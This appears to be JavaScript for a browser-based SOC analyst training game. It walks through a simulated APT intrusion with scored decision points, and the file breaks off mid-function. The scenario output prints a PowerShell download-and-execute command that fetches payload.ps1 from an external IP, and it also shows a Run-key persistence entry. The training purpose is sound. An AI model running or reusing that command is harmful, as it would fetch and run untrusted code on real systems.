// Terminal State
let commandHistory = [];
let historyIndex = -1;
let isProcessing = false;

// Interactive State
let awaitingUserInput = false;
let userInputPromise = null;
let userInputResolver = null;
let currentScore = 0;
let currentDecisions = [];

// DOM Elements
const terminalOutput = document.getElementById('terminal-output');
const terminalInput = document.getElementById('terminal-input');
const currentTime = document.getElementById('current-time');

// Update time
function updateTime() {
    const now = new Date();
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');
    currentTime.textContent = `${hours}:${minutes}`;
}
updateTime();
setInterval(updateTime, 1000);

// Helper Functions
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Interactive Prompt System
async function promptUser(question, options = []) {
    awaitingUserInput = true;

    // Display question
    addOutput(`<div class="info-line mt-2 text-glow-blue font-bold">${question}</div>`);

    // Display options if provided
    if (options.length > 0) {
        for (let i = 0; i < options.length; i++) {
            addOutput(`<div class="result-line">  [${i + 1}] ${options[i]}</div>`);
        }
        addOutput(`<div class="warning-line mt-1">Type 1-${options.length} to choose, or enter custom command</div>`);
    } else {
        addOutput(`<div class="warning-line">Type your response below:</div>`);
    }

    // Wait for user input
    const response = await waitForUserInput();
    awaitingUserInput = false;

    // If options provided and user typed a number, return the option
    if (options.length > 0) {
        const num = parseInt(response);
        if (num >= 1 && num <= options.length) {
            return { choice: num - 1, text: options[num - 1], raw: response };
        }
    }

    return { choice: -1, text: response, raw: response };
}

function waitForUserInput() {
    return new Promise(resolve => {
        userInputResolver = resolve;
    });
}

function submitUserInput(input) {
    if (userInputResolver) {
        userInputResolver(input);
        userInputResolver = null;
    }
}

// Smooth output with optional delay for flowing effect
async function addOutput(html, className = '', delay = 0) {
    if (delay > 0) await sleep(delay);

    const div = document.createElement('div');
    div.className = `output-line ${className}`;
    div.innerHTML = html;
    terminalOutput.appendChild(div);

    // Smooth scroll to bottom
    terminalOutput.scrollTo({
        top: terminalOutput.scrollHeight,
        behavior: 'smooth'
    });

    return div;
}

// Typewriter effect for commands - smooth and natural
async function typewriterCommand(command, speed = 35) {
    const div = document.createElement('div');
    div.className = 'command-line';
    div.innerHTML = `
        <span class="prompt-symbol">❯</span>
        <span id="typing-text" style="color: #60a5fa;"></span>
        <span class="typing-cursor">▋</span>
    `;
    terminalOutput.appendChild(div);

    const textSpan = div.querySelector('#typing-text');
    const cursor = div.querySelector('.typing-cursor');

    // Type each character with slight variation for natural feel
    for (let i = 0; i < command.length; i++) {
        textSpan.textContent += command[i];
        terminalOutput.scrollTo({
            top: terminalOutput.scrollHeight,
            behavior: 'smooth'
        });

        // Variable typing speed for more natural feel
        const variance = Math.random() * 20 - 10; // ±10ms variation
        await sleep(speed + variance);
    }

    // Brief pause before removing cursor
    await sleep(150);
    cursor.style.display = 'none';
}

function addCommandLine(command) {
    const html = `
        <div class="command-line">
            <span class="prompt-symbol">❯</span>
            <span style="color: #60a5fa;">${command}</span>
        </div>
    `;
    addOutput(html);
}

// Output multiple lines with smooth flowing delays
async function addOutputFlow(lines, baseDelay = 50) {
    for (let i = 0; i < lines.length; i++) {
        const line = lines[i];
        await addOutput(line.html, line.className || '', i * baseDelay);
    }
}

// Animated percentage counter
async function animatePercentage(targetPercent, duration = 1000, label = 'Progress') {
    const counterDiv = addOutput(`<div class="info-line mt-2"><span style="color: #00d4ff;">${label}:</span> <span id="counter-${Date.now()}" style="color: #00ff88; font-weight: bold; font-size: 18px;">0%</span></div>`);
    const counter = counterDiv.querySelector('[id^="counter-"]');

    const steps = 20;
    const increment = targetPercent / steps;
    const stepDuration = duration / steps;

    for (let i = 0; i <= steps; i++) {
        const current = Math.min(Math.round(i * increment), targetPercent);
        counter.textContent = current + '%';
        counter.style.textShadow = `0 0 ${10 + (current / 10)}px rgba(0, 255, 136, 0.8)`;
        await sleep(stepDuration);
    }
}

// Boot sequence animation with ASCII art
async function bootSequence() {
    // ASCII Logo
    addOutput('<div class="ascii-art text-glow-green" style="font-size: 10px; line-height: 1.1;"><pre>' +
    '   _____ _____ _____ ___  ___  _____\n' +
    '  / ____| ____|  _  |  \\/  | /  ___|\n' +
    '  \\ `--. | __| | | | | |\\/| | \\ `--.\n' +
    '   `--. \\|  __| |_| | | |  | |  `--. \\\n' +
    '  /\\__/ /| |___\\___/| |  | | /\\__/ /\n' +
    '  \\____/ \\_____\\_/ \\_\\_|  |_/ \\____/\n' +
    '</pre></div>');
    addOutput('<div class="info-line text-glow-green font-bold text-center" style="font-size: 13px;">SECURITY OPERATIONS TERMINAL v2.1</div>');
    await sleep(800);

    addOutput('<div class="info-line text-glow-green font-bold mt-3">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    addOutput('<div class="info-line text-glow-green font-bold text-center">SYSTEM BOOT SEQUENCE INITIATED</div>');
    addOutput('<div class="info-line text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(500);

    addOutput('<div class="result-line mt-2">Initializing BIOS v4.2.1...</div>');
    await sleep(300);
    addOutput('<div class="success-line">✓ CPU: Intel i7-13700K @ 5.4GHz [OK]</div>');
    await sleep(200);
    addOutput('<div class="success-line">✓ Memory Test: 32GB DDR5 [OK]</div>');
    await sleep(200);
    addOutput('<div class="success-line">✓ Storage: 2TB NVMe Gen4 [OK]</div>');
    await sleep(400);

    addOutput('<div class="result-line mt-2">Loading SecOps Kernel...</div>');
    await sleep(300);
    addOutput('<div class="info-line">Mounting encrypted partitions...</div>');
    await sleep(200);
    addOutput('<div class="success-line">✓ /dev/sda1 mounted [🔒 ENCRYPTED]</div>');
    await sleep(200);

    addOutput('<div class="result-line mt-2">Starting Security Services...</div>');
    await sleep(250);
    addOutput('<div class="success-line">✓ Firewall enabled 🛡️</div>');
    await sleep(150);
    addOutput('<div class="success-line">✓ IDS/IPS active 👁️</div>');
    await sleep(150);
    addOutput('<div class="success-line">✓ Threat Intelligence online 🌐</div>');
    await sleep(150);
    addOutput('<div class="success-line">✓ SIEM connected 📊</div>');
    await sleep(400);

    addOutput('<div class="success-line text-glow-green font-bold mt-2 text-center" style="font-size: 16px;">⚡ SYSTEM READY ⚡</div>');
    addOutput('<div class="info-line text-center" style="color: #00ff88; font-size: 12px;">All services operational • Security level: MAXIMUM</div>');
    addOutput('<div class="info-line text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(1000);
}

// Get ASCII art for each incident
function getIncidentAscii(incidentNum) {
    const asciiArt = {
        1: `    ___   _   _  ___ ___ ___ ___ _  _  _____
   |_ _| | \\ | |/ __|_ _|   \\   | \\ | |  | |
    | |  |  \\| | |   | || |) |  |  \\| |  | |
   |___| |_|\\__|\\__|___|___/____|_|\\__|  |_|`,
        2: `    ___   _   _  ___ ___ ___ ___ _  _  _____
   |_ _| | \\ | |/ __|_ _|   \\   | \\ | |  |_ |
    | |  |  \\| | |   | || |) |  |  \\| |   | |
   |___| |_|\\__|\\__|___|___/____|_|\\__|   |_|`,
        3: `    ___   _   _  ___ ___ ___ ___ _  _  _____
   |_ _| | \\ | |/ __|_ _|   \\   | \\ | |  |_ |
    | |  |  \\| | |   | || |) |  |  \\| |   _| |
   |___| |_|\\__|\\__|___|___/____|_|\\__|  |___|`,
        4: `    ___   _   _  ___ ___ ___ ___ _  _  _____
   |_ _| | \\ | |/ __|_ _|   \\   | \\ | |  | | |
    | |  |  \\| | |   | || |) |  |  \\| |  | |_|
   |___| |_|\\__|\\__|___|___/____|_|\\__|  |___|`,
        5: `    ___   _   _  ___ ___ ___ ___ _  _  _____
   |_ _| | \\ | |/ __|_ _|   \\   | \\ | |  | __|
    | |  |  \\| | |   | || |) |  |  \\| |  |__ \\
   |___| |_|\\__|\\__|___|___/____|_|\\__|  |___|`,
        6: `    ___   _   _  ___ ___ ___ ___ _  _  _____
   |_ _| | \\ | |/ __|_ _|   \\   | \\ | |  | _ |
    | |  |  \\| | |   | || |) |  |  \\| |  |  _/
   |___| |_|\\__|\\__|___|___/____|_|\\__|  |_|`,
        7: `    ___   _   _  ___ ___ ___ ___ _  _  _____
   |_ _| | \\ | |/ __|_ _|   \\   | \\ | |  |_  |
    | |  |  \\| | |   | || |) |  |  \\| |   / /
   |___| |_|\\__|\\__|___|___/____|_|\\__|  /___|`,
        8: `    ___   _   _  ___ ___ ___ ___ _  _  _____
   |_ _| | \\ | |/ __|_ _|   \\   | \\ | |  ( _ )
    | |  |  \\| | |   | || |) |  |  \\| |  / _ \\
   |___| |_|\\__|\\__|___|___/____|_|\\__|  \\___/`,
        9: `    ___   _   _  ___ ___ ___ ___ _  _  _____
   |_ _| | \\ | |/ __|_ _|   \\   | \\ | |  | _ \\
    | |  |  \\| | |   | || |) |  |  \\| |  |(_) |
   |___| |_|\\__|\\__|___|___/____|_|\\__|   \\__/`
    };
    return asciiArt[incidentNum] || asciiArt[1];
}

// Incident transition screen with cool boot animation
async function moduleTransition(moduleNum, title) {
    addOutput('<div class="info-line text-glow-blue font-bold mt-4">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');

    // ASCII art for incident number
    const ascii = getIncidentAscii(moduleNum);
    addOutput(`<div class="ascii-art text-glow-blue" style="font-size: 9px; line-height: 1.1; margin: 12px 0;"><pre>${ascii}</pre></div>`);

    addOutput(`<div class="info-line text-center" style="color: #60a5fa; font-size: 13px; margin-top: 8px;">${title}</div>`);
    addOutput('<div class="info-line text-glow-blue font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(600);

    // Matrix-style initialization
    addOutput('<div class="result-line mt-2" style="color: #00ff88;">⚡ INITIALIZING INCIDENT RESPONSE...</div>');
    await sleep(80);

    // Fast data stream with hex codes
    const dataStream = [
        '0x7F45 kernel.module > LOADING',
        '0x8A12 fs.mount > MOUNTING',
        '0x9C3E net.service > STARTING',
        '0xB4F1 security.layer > ACTIVE',
        '0xD6A8 threat.db > SYNCING',
        '0xE2C9 firewall.rules > CONFIGURED',
        '0xF8D3 conn.secure > ESTABLISHED',
        '0x1A5B monitor.tools > ONLINE'
    ];

    for (const stream of dataStream) {
        addOutput(`<div class="success-line" style="font-size: 10px; opacity: 0.9; font-family: 'JetBrains Mono', monospace;">${stream}</div>`);
        await sleep(25); // Very fast Matrix-style
    }

    await sleep(120);

    // Ultra-fast progress bar
    const progressDiv = await addOutput('<div class="progress-bar mt-2"><div class="progress-fill" style="width: 0%"></div></div>');
    const progressBar = progressDiv.querySelector('.progress-fill');

    for (let i = 0; i <= 100; i += 25) {
        progressBar.style.width = i + '%';
        await sleep(35);
    }
    await sleep(150);

    // SCREEN SHAKE + START MISSION ASCII
    document.querySelector('.terminal-frame').classList.add('screen-shake');
    setTimeout(() => document.querySelector('.terminal-frame').classList.remove('screen-shake'), 500);

    addOutput('<div class="ascii-art text-glow-green" style="font-size: 7px; line-height: 1.1; margin: 16px 0;"><pre>' +
    '   _____ _______       _____ _______   __  __ _____  _____ _____ _____ ____  _   _ \n' +
    '  / ____|__   __|/\\   |  __ \\__   __| |  \\/  |_   _|/ ____/ ____|_   _/ __ \\| \\ | |\n' +
    ' | (___    | |  /  \\  | |__) | | |    | \\  / | | | | (___| (___   | || |  | |  \\| |\n' +
    '  \\___ \\   | | / /\\ \\ |  _  /  | |    | |\\/| | | |  \\___ \\\\___ \\  | || |  | | . ` |\n' +
    '  ____) |  | |/ ____ \\| | \\ \\  | |    | |  | |_| |_ ____) |___) |_| || |__| | |\\  |\n' +
    ' |_____/   |_/_/    \\_\\_|  \\_\\ |_|    |_|  |_|_____|_____/_____/|_____\\____/|_| \\_|\n' +
    '</pre></div>');

    await sleep(800);

    addOutput('<div class="success-line text-glow-green font-bold mt-2 text-center" style="font-size: 14px;">⚡ INCIDENT RESPONSE ACTIVE ⚡</div>');
    addOutput('<div class="info-line text-glow-blue font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(500);
}

// INCIDENT 1: APT Group Intrusion Detection (INTERACTIVE VERSION)
async function executeModule1Interactive() {
    currentScore = 0;
    currentDecisions = [];

    // Opening
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╔═══════════════════════════════════════╗</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  INCIDENT 1: APT GROUP DETECTION     ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  INTERACTIVE MODE: Your Decisions Matter ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╚═══════════════════════════════════════╝</div>');
    await sleep(2000);

    // Scenario Setup
    addOutput('<div class="result-line">Date: November 3, 2025 - 02:47 AM</div>');
    addOutput('<div class="warning-line">⚠ ALERT: Suspicious activity detected on corporate network</div>');
    await sleep(2000);

    addOutput('<div class="result-line mt-2">You are a SOC analyst on night shift...</div>');
    addOutput('<div class="result-line">CrowdStrike EDR just triggered a high-severity alert.</div>');
    await sleep(2500);

    // DECISION POINT 1: How to start investigation
    const decision1 = await promptUser(
        "🔍 How do you want to begin your investigation?",
        [
            "Check the EDR console immediately for alert details",
            "Contact the affected user first to understand their actions",
            "Isolate the endpoint before investigating further"
        ]
    );

    currentDecisions.push({point: 1, choice: decision1.choice, text: decision1.text});

    // Response to Decision 1
    if (decision1.choice === 0) {
        // Correct choice
        addOutput('<div class="success-line">✓ Good call! Always start with available data.</div>');
        currentScore += 10;
    } else if (decision1.choice === 1) {
        addOutput('<div class="warning-line">⚠ Warning: Contacting the user may alert the attacker if they\'re monitoring.</div>');
        currentScore += 3;
    } else if (decision1.choice === 2) {
        addOutput('<div class="warning-line">⚠ Isolating now may be premature. Let\'s gather intel first.</div>');
        currentScore += 5;
    }

    await sleep(1500);

    // Initial Investigation
    addOutput('<div class="info-line mt-2">▸ Connecting to CrowdStrike Falcon Console...</div>');
    await sleep(1500);
    addOutput('<div class="success-line">✓ Connected to Falcon Platform</div>');
    await sleep(1000);

    addOutput('<div class="result-line mt-2">Querying recent detections...</div>');
    await sleep(1500);

    // Alert Details
    addOutput(`<div class="warning-line mt-2">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>`);
    addOutput('<div class="error-line">DETECTION: Suspicious PowerShell Execution</div>');
    addOutput('<div class="result-line">Hostname: FINANCE-WKS-042</div>');
    addOutput('<div class="result-line">User: jsmith@corp.local</div>');
    addOutput('<div class="result-line">Process: powershell.exe</div>');
    addOutput('<div class="result-line">Command: -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...</div>');
    addOutput('<div class="warning-line">Severity: CRITICAL</div>');
    addOutput(`<div class="warning-line">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>`);
    await sleep(3000);

    // DECISION POINT 2: Immediate action
    const decision2 = await promptUser(
        "⚡ The PowerShell command is Base64 encoded. What's your next move?",
        [
            "Decode the command to see what it's trying to execute",
            "Immediately isolate the endpoint from the network",
            "Check if other endpoints are affected first",
            "Block the powershell.exe process across all endpoints"
        ]
    );

    currentDecisions.push({point: 2, choice: decision2.choice, text: decision2.text});

    if (decision2.choice === 0) {
        addOutput('<div class="success-line">✓ Excellent! Understanding the threat is crucial.</div>');
        currentScore += 15;
    } else if (decision2.choice === 1) {
        addOutput('<div class="info-line">You isolated the endpoint. Smart containment, but let\'s still decode it.</div>');
        currentScore += 12;
    } else if (decision2.choice === 2) {
        addOutput('<div class="info-line">Good thinking - checking lateral movement is important.</div>');
        currentScore += 10;
    } else {
        addOutput('<div class="warning-line">⚠ Blocking PowerShell org-wide could break legitimate processes!</div>');
        currentScore += 3;
    }

    await sleep(1500);

    // Decoding
    addOutput('<div class="info-line mt-2">▸ Decoding Base64 PowerShell command...</div>');
    await sleep(2000);

    const progressDiv = addOutput('<div class="progress-bar"><div class="progress-fill" id="module1-progress" style="width: 0%"></div></div>');
    for (let i = 0; i <= 100; i += 20) {
        await sleep(400);
        document.getElementById('module1-progress').style.width = i + '%';
    }

    await sleep(800);
    addOutput('<div class="success-line">✓ Decoded successfully</div>');
    await sleep(1000);

    addOutput('<div class="result-line mt-2">Decoded command:</div>');
    addOutput('<div class="code-block">IEX (New-Object Net.WebClient).DownloadString("http://185.220.101.42/payload.ps1")</div>');
    await sleep(2500);

    addOutput('<div class="error-line mt-2">⚠ THREAT IDENTIFIED: Attempting to download and execute payload from external IP</div>');
    await sleep(1500);

    // DECISION POINT 3: Threat intelligence
    const decision3 = await promptUser(
        "🌐 You found an external IP (185.220.101.42). What should you do?",
        [
            "Look up the IP in threat intelligence databases",
            "Block the IP at the firewall immediately",
            "Try to download the payload yourself for analysis",
            "Check network logs for other connections to this IP"
        ]
    );

    currentDecisions.push({point: 3, choice: decision3.choice, text: decision3.text});

    if (decision3.choice === 0) {
        addOutput('<div class="success-line">✓ Perfect! Threat intel can identify known threat actors.</div>');
        currentScore += 15;
    } else if (decision3.choice === 1) {
        addOutput('<div class="info-line">Good defensive move, but let\'s gather intel first.</div>');
        currentScore += 10;
    } else if (decision3.choice === 2) {
        addOutput('<div class="error-line">⚠ DANGEROUS! Never execute or download malware on production systems!</div>');
        currentScore += 0;
    } else {
        addOutput('<div class="success-line">✓ Smart! Checking for lateral movement or data exfiltration.</div>');
        currentScore += 12;
    }

    await sleep(1500);

    // Threat Intel Lookup
    addOutput('<div class="info-line mt-2">▸ Checking IP against threat intelligence...</div>');
    await sleep(2000);

    addOutput('<div class="error-line text-glow-red font-bold mt-2">━━━ THREAT INTELLIGENCE HIT ━━━</div>');
    addOutput('<div class="error-line">IP: 185.220.101.42</div>');
    addOutput('<div class="error-line">Known APT Group: LAZARUS (North Korea)</div>');
    addOutput('<div class="error-line">Campaign: Operation DreamJob</div>');
    addOutput('<div class="error-line">First Seen: 2024-08-15</div>');
    addOutput('<div class="error-line">Confidence: HIGH (95%)</div>');
    await sleep(3000);

    // Screen shake for dramatic effect
    document.querySelector('.terminal-frame').classList.add('screen-shake');
    setTimeout(() => document.querySelector('.terminal-frame').classList.remove('screen-shake'), 500);

    addOutput('<div class="error-line text-glow-red font-bold mt-2">🚨 CRITICAL: State-sponsored APT detected!</div>');
    await sleep(2000);

    // DECISION POINT 4: Escalation
    const decision4 = await promptUser(
        "🚨 You've identified a nation-state APT attack. What's your immediate action?",
        [
            "Escalate to incident commander and security leadership NOW",
            "Continue investigating to gather more evidence first",
            "Isolate all potentially affected systems immediately",
            "Start collecting forensic evidence for law enforcement"
        ]
    );

    currentDecisions.push({point: 4, choice: decision4.choice, text: decision4.text});

    if (decision4.choice === 0) {
        addOutput('<div class="success-line">✓ EXCELLENT! APT incidents require immediate escalation.</div>');
        currentScore += 20;
    } else if (decision4.choice === 1) {
        addOutput('<div class="error-line">⚠ Time is critical! Every second counts with APTs.</div>');
        currentScore += 5;
    } else if (decision4.choice === 2) {
        addOutput('<div class="info-line">Good instinct, but escalate first. Leadership decides containment scope.</div>');
        currentScore += 12;
    } else {
        addOutput('<div class="info-line">Evidence collection is important, but escalate first!</div>');
        currentScore += 8;
    }

    await sleep(1500);

    // Network Analysis
    addOutput('<div class="info-line mt-2">▸ Analyzing network connections...</div>');
    await sleep(1500);

    addOutput('<div class="result-line">Suspicious outbound connection detected:</div>');
    addOutput('<div class="result-line">Source: 10.50.12.87:49823</div>');
    addOutput('<div class="result-line">Destination: 185.220.101.42:443</div>');
    addOutput('<div class="result-line">Protocol: HTTPS</div>');
    addOutput('<div class="result-line">Data Transferred: 847 KB</div>');
    await sleep(2500);

    // DECISION POINT 5: Data exfiltration
    const decision5 = await promptUser(
        "📤 847 KB was transferred out. What's your priority?",
        [
            "Block the IP immediately to stop further exfiltration",
            "Capture network traffic to analyze what was stolen",
            "Check if data is still being exfiltrated right now",
            "Notify the data protection team about potential breach"
        ]
    );

    currentDecisions.push({point: 5, choice: decision5.choice, text: decision5.text});

    if (decision5.choice === 0) {
        addOutput('<div class="success-line">✓ Good! Stop the bleeding first.</div>');
        currentScore += 15;
    } else if (decision5.choice === 1) {
        addOutput('<div class="info-line">Traffic capture is valuable, but stop exfiltration first!</div>');
        currentScore += 8;
    } else if (decision5.choice === 2) {
        addOutput('<div class="success-line">✓ Excellent! Real-time monitoring is critical.</div>');
        currentScore += 18;
    } else {
        addOutput('<div class="info-line">Important notification, but contain the threat first.</div>');
        currentScore += 10;
    }

    await sleep(1500);

    // Final Decision: Containment Strategy
    const decision6 = await promptUser(
        "🛡️ Final decision: How do you contain this incident?",
        [
            "Isolate FINANCE-WKS-042 only",
            "Isolate entire finance department subnet",
            "Isolate endpoint + block C2 IP org-wide + monitor for lateral movement",
            "Shut down the entire corporate network"
        ]
    );

    currentDecisions.push({point: 6, choice: decision6.choice, text: decision6.text});

    if (decision6.choice === 0) {
        addOutput('<div class="warning-line">⚠ Might miss compromised systems. APTs often move laterally.</div>');
        currentScore += 8;
    } else if (decision6.choice === 1) {
        addOutput('<div class="info-line">Good scope, but may be too broad without evidence of spread.</div>');
        currentScore += 12;
    } else if (decision6.choice === 2) {
        addOutput('<div class="success-line text-glow-green font-bold">✓ PERFECT! Balanced containment + monitoring approach!</div>');
        currentScore += 25;
    } else {
        addOutput('<div class="error-line">⚠ Too drastic! Business impact would be severe.</div>');
        currentScore += 3;
    }

    await sleep(2000);

    // Calculate final score and show results
    addOutput('<div class="info-line text-glow-blue font-bold mt-4">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center" style="font-size: 16px;">INCIDENT RESPONSE COMPLETE</div>');
    addOutput('<div class="info-line text-glow-blue font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
    await sleep(500);

    // Score breakdown
    addOutput(`<div class="result-line mt-2">Your Score: <span style="color: #00ff88; font-size: 20px; font-weight: bold;">${currentScore}/100</span></div>`);
    await sleep(800);

    let performance, message, color;
    if (currentScore >= 90) {
        performance = "ELITE ANALYST";
        message = "Outstanding work! You handled this APT incident like a seasoned professional.";
        color = "#00ff88";
    } else if (currentScore >= 75) {
        performance = "SENIOR ANALYST";
        message = "Great job! Your decisions were mostly sound and effective.";
        color = "#00d4ff";
    } else if (currentScore >= 60) {
        performance = "ANALYST";
        message = "Good effort. Review the feedback to improve your incident response.";
        color = "#fbbf24";
    } else {
        performance = "JUNIOR ANALYST";
        message = "Keep practicing! Incident response takes time to master.";
        color = "#ef4444";
    }

    addOutput(`<div class="mt-2" style="color: ${color}; font-size: 18px; font-weight: bold; text-align: center;">${performance}</div>`);
    addOutput(`<div class="result-line text-center mt-1">${message}</div>`);
    await sleep(1500);

    // Show decision recap
    addOutput('<div class="info-line mt-3 font-bold">📋 Your Decisions:</div>');
    currentDecisions.forEach((dec, idx) => {
        addOutput(`<div class="result-line">${idx + 1}. ${dec.text}</div>`);
    });

    await sleep(1000);
    addOutput('<div class="success-line mt-3 text-center">Type "start incident 2" for the next challenge!</div>');
    addOutput('<div class="info-line text-glow-blue font-bold mt-2">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');

    return null;
}

// INCIDENT 1: APT Group Intrusion Detection (ORIGINAL DEMO VERSION)
async function executeModule1() {
    // Opening
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╔═══════════════════════════════════════╗</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  INCIDENT 1: APT GROUP DETECTION     ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">║  Episode 1: The First Alert          ║</div>');
    addOutput('<div class="info-line text-glow-blue font-bold text-center">╚═══════════════════════════════════════╝</div>');
    await sleep(2000);
    
    // Scenario Setup
    addOutput('<div class="result-line">Date: November 3, 2025 - 02:47 AM</div>');
    addOutput('<div class="warning-line">⚠ ALERT: Suspicious activity detected on corporate network</div>');
    await sleep(2000);
    
    addOutput('<div class="result-line mt-2">You are a SOC analyst on night shift...</div>');
    addOutput('<div class="result-line">Cr██dStr███ EDR just triggered a high-severity alert.</div>');
    await sleep(2500);
    
    // Initial Investigation
    addOutput('<div class="info-line mt-2">▸ Initializing Cr██dStr███ Falcon Console...</div>');
    await sleep(1500);
    addOutput('<div class="success-line">✓ Connected to Falcon Platform</div>');
    await sleep(1000);
    
    addOutput('<div class="result-line mt-2">Querying recent detections...</div>');
    await sleep(1500);
    
    // Alert Details
    addOutput(`<div class="warning-line mt-2">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>`);
    addOutput('<div class="error-line">DETECTION: Suspicious PowerShell Execution</div>');
    addOutput('<div class="result-line">Hostname: ███████-WKS-042</div>');
    addOutput('<div class="result-line">User: j████████@corp.local</div>');
    addOutput('<div class="result-line">Process: powershell.exe</div>');
    addOutput('<div class="result-line">Command: -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA...</div>');
    addOutput('<div class="warning-line">Severity: CRITICAL</div>');
    addOutput(`<div class="warning-line">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>`);
    await sleep(3000);
    
    // Decoding
    addOutput('<div class="info-line mt-2">▸ Decoding Base64 PowerShell command...</div>');
    await sleep(2000);
    
    const progressDiv = addOutput('<div class="progress-bar"><div class="progress-fill" id="module1-progress" style="width: 0%"></div></div>');
    for (let i = 0; i <= 100; i += 20) {
        await sleep(400);
        document.getElementById('module1-progress').style.width = i + '%';
    }
    
    await sleep(800);
    addOutput('<div class="success-line">✓ Decoded successfully</div>');
    await sleep(1000);
    
    addOutput('<div class="result-line mt-2">Decoded command:</div>');
    addOutput('<div class="code-block">IEX (New-Object Net.WebClient).DownloadString("http://185.220.XXX.XX/payload.ps1")</div>');
    await sleep(2500);
    
    addOutput('<div class="error-line mt-2">⚠ THREAT IDENTIFIED: Download from external IP</div>');
    await sleep(1500);
    
    // Network Analysis
    addOutput('<div class="info-line mt-2">▸ Analyzing network connections...</div>');
    await sleep(1500);
    
    addOutput('<div class="result-line">Suspicious outbound connection detected:</div>');
    addOutput('<div class="result-line">Source: 10.50.X.XXX:49823</div>');
    addOutput('<div class="result-line">Destination: 185.220.XXX.XX:443</div>');
    addOutput('<div class="result-line">Protocol: HTTPS</div>');
    addOutput('<div class="result-line">Data Transferred: 847 KB</div>');
    await sleep(2500);
    
    // Threat Intel Lookup
    addOutput('<div class="info-line mt-2">▸ Checking IP against threat intelligence...</div>');
    await sleep(2000);
    
    addOutput('<div class="error-line text-glow-red font-bold mt-2">━━━ THREAT INTELLIGENCE HIT ━━━</div>');
    addOutput('<div class="error-line">IP: 185.220.XXX.XX</div>');
    addOutput('<div class="error-line">Known APT Group: LAZARUS (NK)</div>');
    addOutput('<div class="error-line">Campaign: Operation DreamJob</div>');
    addOutput('<div class="error-line">First Seen: 2024-08-15</div>');
    addOutput('<div class="error-line">Confidence: HIGH (95%)</div>');
    await sleep(3000);
    
    // Process Tree Analysis
    addOutput('<div class="info-line mt-2">▸ Analyzing process execution tree...</div>');
    await sleep(1500);
    
    addOutput('<div class="result-line mt-2"><pre style="font-size: 12px; color: #e5e7eb;">outlook.exe (PID: 2847)\n  └─> wscript.exe (PID: 3912)\n      └─> powershell.exe (PID: 4156) <span style="color: #ef4444;">← SUSPICIOUS</span>\n          └─> cmd.exe (PID: 4289)\n              └─> reg.exe (PID: 4301) <span style="color: #ef4444;">← PERSISTENCE</span></pre></div>');
    await sleep(3000);
    
    // Registry Modification
    addOutput('<div class="warning-line mt-2">⚠ Registry modification detected:</div>');
    addOutput('<div class="result-line">Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</div>');
    addOutput('<div class="result-line">Value: SystemUpdate</div>');
    addOutput('<div class="result-line">Data: C:\\Users\\j████████\\AppData\\Roaming\\svchost.exe</div>');
    await sleep(2500);
    
    addOutput('<div class="error-line mt-2">⚠ PERSISTENCE MECHANISM ESTABLISHED</div>');
    await sleep(1500);
    
    // File Analysis
    addOutput('<div class="info-line mt-2">▸ Analyzing dropped file...</div>');
    await sleep(1500);
    
    addOutput('<div class="result-line">File: svchost.exe (Masquerading)</div>');
    addOutput('<div class="result-line">Path: C:\\Users\\j████████\\AppData\\Roaming\\</div>');
    addOutput('<div class="result-line">Size: 2.4 MB</div>');
    addOutput('<div class="result-line">SHA256: a7f3d9b2c8e1...</div>');
    await sleep(2000);
    
    addOutput('<div class="error-line">VirusTotal: 52/72 detections</div>');
    addOutput('<div class="error-line">Classification: Trojan.Lazarus.Agent</div>');
    await sleep(2000);
    
    // Incident Summary
    addOutput('<div class="info-line mt-2 font-bold">━━━━━ INCIDENT SUMMARY ━━━━━</div>');
    addOutput('<div class="result-line">Attack Vector: Phishing Email → Malicious Attachment</div>');
    addOutput('<div class="result-line">Initial Access: 02:34 AM</div>');
    addOutput('<div class="result-line">Payload: Remote Access Trojan (RAT)</div>');
    addOutput('<div class="result-line">Capability: Keylogging, Screen Capture, Data Exfil</div>');
    addOutput('<div class="result-line">Threat Actor: LAZARUS APT Group</div>');
    await sleep(3000);
    
    // Response Actions
    addOutput('<div class="warning-line mt-2 font-bold">⚠ IMMEDIATE ACTIONS REQUIRED:</div>');
    await sleep(800);
    addOutput('<div class="success-line">✓ Isolate host ███████-WKS-042 from network</div>');
    await sleep(800);
    addOutput('<div class="success-line">✓ Disable user account j████████@corp.local</div>');
    await sleep(800);
    addOutput('<div class="success-line">✓ Block IP 185.220.XXX.XX at firewall</div>');
    await sleep(800);
    addOutput('<div class="success-line">✓ Deploy containment script to all endpoints</div>');
    await sleep(800);
    addOutput('<div class="success-line">✓ Escalate to Incident Response team</div>');
    await sleep(1500);
    
    // Closing
    addOutput('<div class="success-line mt-2 text-glow-green font-bold">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</div>');
